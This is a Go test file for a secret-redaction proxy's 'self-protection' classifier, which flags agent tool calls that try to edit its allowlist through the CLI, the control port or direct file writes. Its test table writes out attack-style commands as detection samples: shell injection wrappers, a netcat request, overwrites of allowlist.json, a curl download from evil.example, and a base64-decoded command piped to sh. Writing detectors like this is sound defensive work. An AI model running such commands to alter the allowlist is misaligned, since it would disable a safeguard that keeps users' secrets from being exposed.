package proxy

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/fregie/tokenhush/pkg/allowlist"
	"github.com/fregie/tokenhush/pkg/config"
	"github.com/fregie/tokenhush/pkg/protocol"
	"github.com/fregie/tokenhush/pkg/redact"
)

// W6.2 test coordinates: a realistic data root and the bound control port. The
// classifier takes both from the context, so these test values stand in for
// what pkg/gateway installs at run time.
const (
	w62ControlPort = 8787
	w62DataDir     = "/home/u/.local/share/tokenhush"
)

func w62AllowlistPath() string { return w62DataDir + "/allowlist.json" }

func w62Context() MutationChannelContext {
	return MutationChannelContext{ControlPort: w62ControlPort, AllowlistPath: w62AllowlistPath()}
}

// TestMutationChannelPatterns is the W6.2 acceptance test: the classifier is a
// pure function over a candidate text (a tool-call argument value or a nested
// leaf's content) with three explicitly enumerated classes — CLI command,
// control-port direct connection and direct file write — and it must not match
// the innocent shapes around them.
func TestMutationChannelPatterns(t *testing.T) {
	ctx := w62Context()

	cases := []struct {
		name  string
		class string // "" means the text must NOT match
		text  string
	}{
		// Class 1 — the CLI: tokenhush / tokenhush-pro with the allowlist
		// subcommand, wrapped in the common shell spellings.
		{name: "cli_plain", class: MutationChannelCLI,
			text: "tokenhush allowlist add entry-value"},
		{name: "cli_pro_binary", class: MutationChannelCLI,
			text: "tokenhush-pro allowlist remove entry-value"},
		{name: "cli_no_mutating_verb_is_not_a_mutation", text: "tokenhush allowlist"},
		{name: "cli_sh_c", class: MutationChannelCLI,
			text: `sh -c "tokenhush allowlist add entry-value"`},
		{name: "cli_bash_c_single_quotes", class: MutationChannelCLI,
			text: "bash -c 'tokenhush allowlist add entry-value'"},
		{name: "cli_backticks", class: MutationChannelCLI,
			text: "`tokenhush allowlist add entry-value`"},
		{name: "cli_command_substitution", class: MutationChannelCLI,
			text: "echo done && $(tokenhush allowlist remove entry-value)"},
		{name: "cli_pipe", class: MutationChannelCLI,
			text: "cat entries.txt | tokenhush allowlist remove entry-value"},
		{name: "cli_and_chain", class: MutationChannelCLI,
			text: "true && tokenhush allowlist add entry-value"},
		// Wrapper prefixes are a recorded residual: the simple execution-position
		// boundary set does not model them, so they are mentions, not invocations.
		{name: "cli_sudo_is_a_residual_mention", text: "sudo tokenhush allowlist add entry-value"},
		{name: "cli_env_wrapper_is_a_residual_mention", text: "env TOKENHUSH_HOME=/tmp/u tokenhush allowlist add entry-value"},
		{name: "cli_absolute_path", class: MutationChannelCLI,
			text: "/usr/local/bin/tokenhush allowlist add entry-value"},
		// A Windows path with spaces needs the retired path-word join, so it is a
		// recorded residual mention.
		{name: "cli_windows_exe_path_with_spaces_is_a_residual_mention",
			text: `C:\Program Files\Tokenhush\tokenhush.exe allowlist add entry-value`},
		{name: "cli_tabs_and_mixed_case", class: MutationChannelCLI,
			text: "\tTokenHush\tAllowList\tAdd\tentry-value\t"},
		{name: "cli_uppercase", class: MutationChannelCLI,
			text: "TOKENHUSH ALLOWLIST ADD entry-value"},
		{name: "cli_line_continuation", class: MutationChannelCLI,
			text: "tokenhush \\\n allowlist add entry-value"},

		// Class 2 — a reach for the control plane: the bound port WITH control
		// evidence (a control endpoint path, or a control request line).
		{name: "port_curl_v4", class: MutationChannelControlPort,
			text: "curl -sS http://127.0.0.1:8787/allowlist -X POST"},
		{name: "port_curl_localhost", class: MutationChannelControlPort,
			text: "curl -sS http://localhost:8787/allowlist"},
		{name: "port_wget_v6", class: MutationChannelControlPort,
			text: "wget -qO- http://[::1]:8787/allowlist"},
		{name: "port_bare_hostport_path", class: MutationChannelControlPort,
			text: "127.0.0.1:8787/allowlist?x=1"},
		{name: "port_bare_localhost_path", class: MutationChannelControlPort,
			text: "localhost:8787/allowlist"},
		{name: "port_post_allowlist", class: MutationChannelControlPort,
			text: "curl -X POST http://127.0.0.1:8787/allowlist"},
		// /status is read-only, so it is evidence only with a mutation.
		{name: "port_post_status", class: MutationChannelControlPort,
			text: "curl -X POST http://127.0.0.1:8787/status"},
		{name: "port_put_status", class: MutationChannelControlPort,
			text: "curl -X PUT http://127.0.0.1:8787/status -d @body"},
		{name: "port_curl_data_implies_post_status", class: MutationChannelControlPort,
			text: "curl -d @body http://127.0.0.1:8787/status"},
		{name: "port_request_line", class: MutationChannelControlPort,
			text: "POST /allowlist HTTP/1.1\r\nHost: 127.0.0.1:8787\r\nContent-Type: application/json"},
		{name: "port_request_line_bare_verb", class: MutationChannelControlPort,
			text: "DELETE /allowlist"},
		{name: "port_request_line_delete_status", class: MutationChannelControlPort,
			text: "DELETE /status HTTP/1.1\r\nHost: 127.0.0.1:8787"},
		{name: "port_netcat_space_separated", class: MutationChannelControlPort,
			text: "printf 'DELETE /allowlist HTTP/1.1\r\n\r\n' | nc 127.0.0.1 8787"},
		{name: "port_invoke_webrequest", class: MutationChannelControlPort,
			text: "Invoke-WebRequest -Method Post -Uri http://localhost:8787/allowlist"},
		{name: "port_delete_verb", class: MutationChannelControlPort,
			text: "DELETE /allowlist HTTP/1.1\nHost: 127.0.0.1:8787"},

		// Class 3 — a direct write to <DataDir>/allowlist.json.
		{name: "file_redirect", class: MutationChannelFileWrite,
			text: `echo '{"schema_version":1}' > /home/u/.local/share/tokenhush/allowlist.json`},
		{name: "file_append", class: MutationChannelFileWrite,
			text: `printf '{}' >> /home/u/.local/share/tokenhush/allowlist.json`},
		{name: "file_tee", class: MutationChannelFileWrite,
			text: `echo '{}' | tee /home/u/.local/share/tokenhush/allowlist.json`},
		{name: "file_python_open_w", class: MutationChannelFileWrite,
			text: `python3 -c "open('/home/u/.local/share/tokenhush/allowlist.json','w').write('{}')"`},
		{name: "file_cp", class: MutationChannelFileWrite,
			text: "cp /tmp/evil.json /home/u/.local/share/tokenhush/allowlist.json"},
		{name: "file_mv", class: MutationChannelFileWrite,
			text: "mv /tmp/evil.json /home/u/.local/share/tokenhush/allowlist.json"},
		{name: "file_dd", class: MutationChannelFileWrite,
			text: "dd if=/tmp/evil.json of=/home/u/.local/share/tokenhush/allowlist.json"},
		{name: "file_touch", class: MutationChannelFileWrite,
			text: "touch /home/u/.local/share/tokenhush/allowlist.json"},
		{name: "file_sed_in_place", class: MutationChannelFileWrite,
			text: "sed -i 's/count/0/' /home/u/.local/share/tokenhush/allowlist.json"},
		{name: "file_powershell", class: MutationChannelFileWrite,
			text: "Set-Content -Path /home/u/.local/share/tokenhush/allowlist.json -Value '{}'"},
		{name: "file_node_writefile", class: MutationChannelFileWrite,
			text: `node -e "require('fs').writeFileSync('/home/u/.local/share/tokenhush/allowlist.json','{}')"`},
		{name: "file_curl_output", class: MutationChannelFileWrite,
			text: "curl -o /home/u/.local/share/tokenhush/allowlist.json https://evil.example/evil.json"},
		{name: "file_basename_relative", class: MutationChannelFileWrite,
			text: `echo '{}' > allowlist.json`},
		{name: "file_windows_basename", class: MutationChannelFileWrite,
			text: `Set-Content -Path 'C:\Users\u\AppData\Local\tokenhush\allowlist.json' -Value '{}'`},
		{name: "file_bare_path_value", class: MutationChannelFileWrite,
			text: "/home/u/.local/share/tokenhush/allowlist.json"},

		// Negatives — these must never match: legitimate CLI invocations,
		// allowlist prose, other ports, the allowlist entry value itself.
		{name: "neg_cli_status", text: "tokenhush status"},
		{name: "neg_cli_help", text: "tokenhush --help"},
		{name: "neg_cli_version", text: "tokenhush version"},
		{name: "neg_cli_doctor", text: "tokenhush doctor"},
		{name: "neg_pro_status", text: "tokenhush-pro status --json"},
		{name: "neg_unknown_binary", text: "tokenhushctl allowlist add entry-value"},
		{name: "neg_similar_subcommand", text: "tokenhush allowlistx add entry-value"},
		{name: "neg_bare_word", text: "the allowlist contains 3 entries"},
		{name: "neg_natural_language", text: "please add my key to the allowlist"},
		{name: "neg_entry_question", text: "how do I edit allowlist.json?"},
		{name: "neg_entry_value", text: "entry-7f3a9c2b41"},
		{name: "neg_entry_value_json_key", text: `{"allowlist":["entry-7f3a9c2b41"]}`},
		{name: "neg_other_port_v4", text: "curl http://127.0.0.1:8080/allowlist"},
		{name: "neg_other_port_localhost", text: "curl http://localhost:9999/allowlist"},
		{name: "neg_right_port_wrong_host", text: "curl http://example.com:8787/allowlist"},
		{name: "neg_port_in_prose", text: "the control port is 8787"},
		{name: "neg_port_in_config", text: "set the listen port to 8787 in tokenhush.yaml"},
		// A data-plane path on the real control port is legitimate traffic: the
		// port alone is never evidence of the control channel.
		{name: "neg_data_plane_chat_completions", text: "curl http://127.0.0.1:8787/v1/chat/completions"},
		{name: "neg_data_plane_messages", text: "http://127.0.0.1:8787/v1/messages"},
		{name: "neg_data_plane_anthropic_messages", text: "curl -X POST http://localhost:8787/v1/messages -d @req.json"},
		{name: "neg_http_client_port_no_path", text: "curl http://127.0.0.1:8787"},
		{name: "neg_bare_hostport_no_path", text: "127.0.0.1:8787"},
		{name: "neg_control_path_other_port", text: "curl http://127.0.0.1:8786/allowlist"},
		{name: "neg_control_path_other_port_status", text: "GET http://127.0.0.1:8786/status"},
		// A read-only reach for /status is not the mutation channel: it reads
		// metadata and cannot weaken redaction.
		{name: "neg_read_only_status_curl", text: "curl http://127.0.0.1:8787/status"},
		{name: "neg_read_only_status_bare_url", text: "http://127.0.0.1:8787/status"},
		{name: "neg_read_only_status_get", text: "GET http://127.0.0.1:8787/status"},
		{name: "neg_read_only_status_head", text: "HEAD http://127.0.0.1:8787/status"},
		{name: "neg_read_only_status_wget", text: "wget -qO- http://localhost:8787/status"},
		{name: "neg_read_only_status_verbose", text: "curl -sS http://127.0.0.1:8787/status"},
		{name: "neg_unrelated_path_write", text: "echo hi > /home/u/Documents/notes.json"},
		{name: "neg_unrelated_path_read", text: "cat /home/u/Documents/notes.json"},
		{name: "neg_read_only_allowlist_file", text: "cat /home/u/.local/share/tokenhush/allowlist.json"},
		{name: "neg_empty", text: ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			class, matched := ClassifyMutationChannel(tc.text, ctx)
			if tc.class == "" {
				if matched {
					t.Fatalf("ClassifyMutationChannel(%q) matched class %q, want no match", tc.text, class)
				}
				return
			}
			if !matched || class != tc.class {
				t.Fatalf("ClassifyMutationChannel(%q) = (%q, %v), want (%q, true)", tc.text, class, matched, tc.class)
			}
		})
	}

	// A port with a trailing zero used to lose its last digit (43210 matched
	// as "4321"): keep this regression case separate from the 8787 table.
	t.Run("port_ending_in_zero", func(t *testing.T) {
		zeroPort := MutationChannelContext{ControlPort: 43210, AllowlistPath: w62AllowlistPath()}
		if class, matched := ClassifyMutationChannel("curl http://127.0.0.1:43210/allowlist", zeroPort); !matched || class != MutationChannelControlPort {
			t.Fatalf("port 43210 = (%q, %v), want (%q, true)", class, matched, MutationChannelControlPort)
		}
		if _, matched := ClassifyMutationChannel("curl http://127.0.0.1:4321/allowlist", zeroPort); matched {
			t.Fatal("port 4321 matched although the control port is 43210")
		}
		if _, matched := ClassifyMutationChannel("curl http://127.0.0.1:432100/allowlist", zeroPort); matched {
			t.Fatal("port 432100 matched although the control port is 43210")
		}
	})

	// The boundary the plan singles out: mere presence of the word
	// "allowlist" is never a match on its own.
	t.Run("bare_allowlist_word_never_matches", func(t *testing.T) {
		for _, text := range []string{"allowlist", "allowlist add", "the allowlist", `"allowlist":"x"`, "allowlist: []"} {
			if class, matched := ClassifyMutationChannel(text, ctx); matched {
				t.Fatalf("bare allowlist text %q matched class %q", text, class)
			}
		}
	})

	// Nested shapes: W6.3 feeds the classifier every nested leaf of a tool
	// call's arguments, including double-encoded ('#' path) leaves.
	t.Run("nested_tool_call_arguments", func(t *testing.T) {
		arguments := `{"cmd":"tokenhush allowlist add entry-value","note":"ok"}`
		body := []byte(`{"tools":[{"name":"shell","arguments":` + strconv.Quote(arguments) + `}]}`)
		walked, err := protocol.Walk(body)
		if err != nil {
			t.Fatalf("walk: %v", err)
		}
		var visited int
		for _, leaf := range walked {
			if leaf.Path != "/tools/0/arguments#/cmd" {
				continue
			}
			visited++
			if !strings.Contains(leaf.Path, "#") {
				t.Fatalf("expected a '#'-nested path, got %q", leaf.Path)
			}
			class, matched := ClassifyMutationChannel(leaf.Content, ctx)
			if !matched || class != MutationChannelCLI {
				t.Fatalf("nested leaf %q content %q = (%q, %v), want CLI match", leaf.Path, leaf.Content, class, matched)
			}
		}
		if visited != 1 {
			t.Fatalf("the '#'-nested command leaf was not visited exactly once: %+v", walked)
		}
		// The encoded parent leaf (the whole arguments string) is a MENTION at
		// the raw text level: the guarded token sits inside a JSON string value,
		// not at a shell command word. The production path analyses its nested
		// leaves, and the pipeline's encoded matcher walks them and reports the
		// CLI match.
		for _, leaf := range walked {
			if leaf.Path == "/tools/0/arguments" {
				if class, matched := ClassifyMutationChannel(leaf.Content, ctx); matched {
					t.Fatalf("raw encoded parent %q matched class %q, want a mention", leaf.Path, class)
				}
				pipe := w62Pipeline(t, true, []string{MutationChannelCLI})
				if class, matched := pipe.matchEncodedArguments([]byte(leaf.Content)); !matched || class != MutationChannelCLI {
					t.Fatalf("encoded matcher %q = (%q, %v), want CLI match", leaf.Path, class, matched)
				}
			}
		}
	})

	t.Run("double_encoded_leaf", func(t *testing.T) {
		body := []byte(`{"x":"\"tokenhush allowlist add entry-value\""}`)
		walked, err := protocol.Walk(body)
		if err != nil {
			t.Fatalf("walk: %v", err)
		}
		var visited int
		for _, leaf := range walked {
			if leaf.Path != "/x#" {
				continue
			}
			visited++
			if class, matched := ClassifyMutationChannel(leaf.Content, ctx); !matched || class != MutationChannelCLI {
				t.Fatalf("double-encoded leaf %q content %q = (%q, %v), want CLI match", leaf.Path, leaf.Content, class, matched)
			}
		}
		if visited != 1 {
			t.Fatalf("the double-encoded leaf was not visited exactly once: %+v", walked)
		}
	})

	t.Run("arguments_not_valid_json_is_a_terminal_leaf", func(t *testing.T) {
		body := []byte(`{"name":"shell","arguments":"tokenhush allowlist add entry-value"}`)
		walked, err := protocol.Walk(body)
		if err != nil {
			t.Fatalf("walk: %v", err)
		}
		var visited int
		for _, leaf := range walked {
			if leaf.Path != "/arguments" {
				continue
			}
			visited++
			if leaf.Encoded {
				t.Fatalf("the non-JSON arguments leaf must be terminal, got an Encoded parent")
			}
			if class, matched := ClassifyMutationChannel(leaf.Content, ctx); !matched || class != MutationChannelCLI {
				t.Fatalf("terminal arguments leaf %q = (%q, %v), want CLI match", leaf.Content, class, matched)
			}
		}
		if visited != 1 {
			t.Fatalf("the terminal arguments leaf was not visited exactly once: %+v", walked)
		}
	})

	t.Run("nested_negative_status", func(t *testing.T) {
		body := []byte(`{"name":"shell","arguments":"tokenhush status --json"}`)
		walked, err := protocol.Walk(body)
		if err != nil {
			t.Fatalf("walk: %v", err)
		}
		for _, leaf := range walked {
			if class, matched := ClassifyMutationChannel(leaf.Content, ctx); matched {
				t.Fatalf("innocent nested leaf %q matched class %q", leaf.Content, class)
			}
		}
	})

	// Honesty gate (the plan's QA-failure requirement): the base64-encoded
	// command is deliberately NOT covered, and the limitation is recorded in
	// the known-uncovered list this test also checks is non-empty.
	t.Run("honesty_base64_command_is_not_covered", func(t *testing.T) {
		command := "tokenhush allowlist add entry-value"
		encoded := base64.StdEncoding.EncodeToString([]byte(command))
		text := "echo '" + encoded + "' | base64 -d | sh"
		class, matched := ClassifyMutationChannel(text, ctx)
		if matched {
			t.Fatalf("base64-encoded command matched class %q; the known-uncovered list would be dishonest: %q", class, text)
		}
		list := KnownUncoveredMutationChannels()
		if len(list) == 0 {
			t.Fatal("KnownUncoveredMutationChannels() is empty")
		}
		if !anyMutationUncoveredClass(list, "base64") {
			t.Fatalf("the base64/encoded-command limitation is not recorded: %q", list)
		}
		t.Logf("base64 command (%d bytes encoded) not matched, as documented; known uncovered classes (%d): %q", len(encoded), len(list), list)
	})

	// Pattern inventory: explicit, testable and auditable.
	t.Run("pattern_inventory_is_explicit_and_auditable", func(t *testing.T) {
		inventory := MutationChannelPatternInventory()
		if len(inventory) != len(mutationChannelPatterns) {
			t.Fatalf("inventory has %d entries, pattern table has %d", len(inventory), len(mutationChannelPatterns))
		}
		if len(inventory) == 0 {
			t.Fatal("pattern inventory is empty")
		}
		seen := make(map[string]struct{}, len(inventory))
		for i, id := range inventory {
			if id == "" {
				t.Fatalf("inventory entry %d is empty", i)
			}
			if _, dup := seen[id]; dup {
				t.Fatalf("inventory entry %q is duplicated", id)
			}
			seen[id] = struct{}{}
		}
		for _, class := range mutationChannelClasses {
			if !anyMutationUncoveredClass(inventory, class) {
				t.Fatalf("class %q has no auditable pattern entry: %q", class, inventory)
			}
		}
		t.Logf("pattern inventory (%d): %q", len(inventory), inventory)
	})

	// The classifier must never panic on arbitrary bytes.
	t.Run("arbitrary_bytes_never_panic", func(t *testing.T) {
		hostile := []string{
			"\xff\xfe tokenhush allowlist",
			strings.Repeat(">", 4096),
			"127.0.0.1:" + strings.Repeat("8", 512),
			"tokenhush\x00allowlist",
			"tokenhush allowlist\x80\x81",
			"curl http://[::1]:8787",
			"open(" + strings.Repeat("'w'", 128),
			"\u202e tokenhush allowlist",
		}
		for _, text := range hostile {
			if class, matched := ClassifyMutationChannel(text, ctx); matched && class == "" {
				t.Fatalf("matched with an empty class for %q", text)
			}
		}
	})
}

// TestKnownUncoveredMutationChannels locks the honesty list to its
// documentation artifact: the accessor must be non-empty, must equal the file
// byte for byte (so the two cannot drift), and must explicitly record the
// classes the plan requires — base64/encoded commands, indirect scripts,
// multi-step assembly, the wrapper prefixes the simple execution-position
// boundary set does not model, and the indirect-execution class reached through
// the mention exemption.
func TestKnownUncoveredMutationChannels(t *testing.T) {
	list := KnownUncoveredMutationChannels()
	if len(list) == 0 {
		t.Fatal("KnownUncoveredMutationChannels() is empty")
	}

	path := filepath.Join("testdata", "known_uncovered_mutations.txt")
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	if len(strings.TrimSpace(string(raw))) == 0 {
		t.Fatalf("%s is empty", path)
	}
	parsed := parseMutationUncoveredList(raw)
	if !slices.Equal(list, parsed) {
		t.Fatalf("accessor and %s drifted:\n accessor=%q\n file=%q", path, list, parsed)
	}

	for _, want := range []string{"base64", "indirect", "multi-step", "wrapper"} {
		if !anyMutationUncoveredClass(list, want) {
			t.Fatalf("the %q limitation is not recorded: %q", want, list)
		}
	}
	t.Logf("known uncovered mutation classes (%d): %q", len(list), list)
}

// parseMutationUncoveredList parses one class per line, dropping blank lines
// and '#' comments, mirroring the pkg/redact known-uncovered artifact.
func parseMutationUncoveredList(raw []byte) []string {
	var out []string
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		out = append(out, line)
	}
	return out
}

// anyMutationUncoveredClass reports whether any entry contains want
// (case-insensitive).
func anyMutationUncoveredClass(list []string, want string) bool {
	want = strings.ToLower(want)
	for _, entry := range list {
		if strings.Contains(strings.ToLower(entry), want) {
			return true
		}
	}
	return false
}

// TestMutationChannelFrozenIDs locks the three class ids to pkg/config's
// self-protection mode ids (the pipeline gates on those exact strings) and the
// allowlist file name to pkg/allowlist.FileName (the gateway installs the real
// path). Both cross-checks live here so a rename cannot silently desync the
// detector from the configuration vocabulary or the frozen C7 file name.
func TestMutationChannelFrozenIDs(t *testing.T) {
	modes := config.SelfProtection{Enabled: true, Modes: []string{
		config.SelfProtectionModeCLICommand,
		config.SelfProtectionModeControlPort,
		config.SelfProtectionModeFileWrite,
	}}.EnabledModes()
	if !slices.Equal(modes, mutationChannelClasses[:]) {
		t.Fatalf("class ids %q != config.EnabledModes() %q", mutationChannelClasses, modes)
	}
	if MutationChannelCLI != config.SelfProtectionModeCLICommand ||
		MutationChannelControlPort != config.SelfProtectionModeControlPort ||
		MutationChannelFileWrite != config.SelfProtectionModeFileWrite {
		t.Fatalf("class constants drifted from pkg/config: %q %q %q",
			MutationChannelCLI, MutationChannelControlPort, MutationChannelFileWrite)
	}
	if mutationChannelAllowlistFileName != allowlist.FileName {
		t.Fatalf("allowlist file name %q != allowlist.FileName %q",
			mutationChannelAllowlistFileName, allowlist.FileName)
	}
}

// w62Pipeline builds a W6.2 test pipeline with the given self-protection
// switch and modes.
func w62Pipeline(t *testing.T, enabled bool, modes []string) *Pipeline {
	t.Helper()
	engine, err := redact.NewPlaceholderEngine()
	if err != nil {
		t.Fatalf("NewPlaceholderEngine() error = %v", err)
	}
	pipe, err := NewPipeline(PipelineConfig{
		Engine:                engine,
		Tool:                  "w6.2-test",
		SelfProtectionEnabled: enabled,
		SelfProtectionModes:   modes,
	})
	if err != nil {
		t.Fatalf("NewPipeline() error = %v", err)
	}
	return pipe
}

// TestPipelineDetectMutationChannel locks the pipeline-level seam W6.3
// consumes: the runtime context is installed after the listener binds (port
// and data dir are unknown at construction), the switch and the mode list gate
// the classifier, and a nil or disabled pipeline is a complete no-op.
func TestPipelineDetectMutationChannel(t *testing.T) {
	ctx := w62Context()
	all := []string{MutationChannelCLI, MutationChannelControlPort, MutationChannelFileWrite}

	t.Run("installed_context_drives_every_class", func(t *testing.T) {
		pipe := w62Pipeline(t, true, all)
		if got := pipe.MutationChannelContext(); got != (MutationChannelContext{}) {
			t.Fatalf("uninstalled context = %+v, want zero", got)
		}
		pipe.SetSelfProtectionChannel(ctx)
		if got := pipe.MutationChannelContext(); got != ctx {
			t.Fatalf("installed context = %+v, want %+v", got, ctx)
		}
		for _, tc := range []struct{ text, class string }{
			{"tokenhush allowlist add entry-value", MutationChannelCLI},
			{"curl http://127.0.0.1:8787/allowlist", MutationChannelControlPort},
			{"echo x > /home/u/.local/share/tokenhush/allowlist.json", MutationChannelFileWrite},
		} {
			class, matched := pipe.DetectMutationChannel(tc.text)
			if !matched || class != tc.class {
				t.Fatalf("DetectMutationChannel(%q) = (%q, %v), want (%q, true)", tc.text, class, matched, tc.class)
			}
		}
	})

	t.Run("disabled_mode_is_not_matched_by_the_pipeline", func(t *testing.T) {
		pipe := w62Pipeline(t, true, []string{MutationChannelCLI})
		pipe.SetSelfProtectionChannel(ctx)
		if _, matched := pipe.DetectMutationChannel("tokenhush allowlist add entry-value"); !matched {
			t.Fatal("cli-command is enabled but the CLI text did not match")
		}
		if class, matched := pipe.DetectMutationChannel("curl http://127.0.0.1:8787/allowlist"); matched {
			t.Fatalf("control-port matched class %q although its mode is not enabled", class)
		}
		// Non-vacuity: the pure classifier still sees the very same text, so
		// the pipeline refusal above is mode gating, not a broken pattern.
		if class, matched := ClassifyMutationChannel("curl http://127.0.0.1:8787/allowlist", ctx); !matched || class != MutationChannelControlPort {
			t.Fatalf("pure classifier = (%q, %v), want (%q, true)", class, matched, MutationChannelControlPort)
		}
	})

	t.Run("disabled_self_protection_is_a_noop", func(t *testing.T) {
		pipe := w62Pipeline(t, false, all)
		pipe.SetSelfProtectionChannel(ctx)
		if got := pipe.MutationChannelContext(); got != (MutationChannelContext{}) {
			t.Fatalf("a disabled pipeline installed a context: %+v", got)
		}
		if class, matched := pipe.DetectMutationChannel("tokenhush allowlist add entry-value"); matched {
			t.Fatalf("a disabled pipeline matched class %q", class)
		}
	})

	t.Run("nil_pipeline_is_safe", func(t *testing.T) {
		var pipe *Pipeline
		pipe.SetSelfProtectionChannel(ctx) // must not panic
		if got := pipe.MutationChannelContext(); got != (MutationChannelContext{}) {
			t.Fatalf("nil pipeline context = %+v, want zero", got)
		}
		if class, matched := pipe.DetectMutationChannel("tokenhush allowlist add entry-value"); matched {
			t.Fatalf("nil pipeline matched class %q", class)
		}
	})

	t.Run("zero_context_still_catches_the_relative_write", func(t *testing.T) {
		// The basename pattern needs no data directory: a literal
		// `allowlist.json` plus a write signal stays covered even before the
		// gateway installs the runtime path.
		if class, matched := ClassifyMutationChannel(`echo '{}' > allowlist.json`, MutationChannelContext{}); !matched || class != MutationChannelFileWrite {
			t.Fatalf("relative allowlist.json write = (%q, %v), want (%q, true)", class, matched, MutationChannelFileWrite)
		}
		if _, matched := ClassifyMutationChannel("/home/u/.local/share/tokenhush/allowlist.json", MutationChannelContext{}); matched {
			// A bare path only matches when the runtime path is known; a
			// zero context must not guess it.
			t.Fatal("a bare path matched although the context has no allowlist path")
		}
	})
}

// BenchmarkClassifyMutationChannel pins the performance contract: the
// classifier runs on the response path over tool-call arguments, so it must
// not compile a pattern at call time and must not allocate per call.
func BenchmarkClassifyMutationChannel(b *testing.B) {
	ctx := w62Context()
	texts := []string{
		"tokenhush allowlist add entry-value",
		"curl -sS http://127.0.0.1:8787/allowlist -X POST",
		`echo '{"schema_version":1}' > /home/u/.local/share/tokenhush/allowlist.json`,
		"please add my key to the allowlist",
	}
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		ClassifyMutationChannel(texts[i%len(texts)], ctx)
	}
}
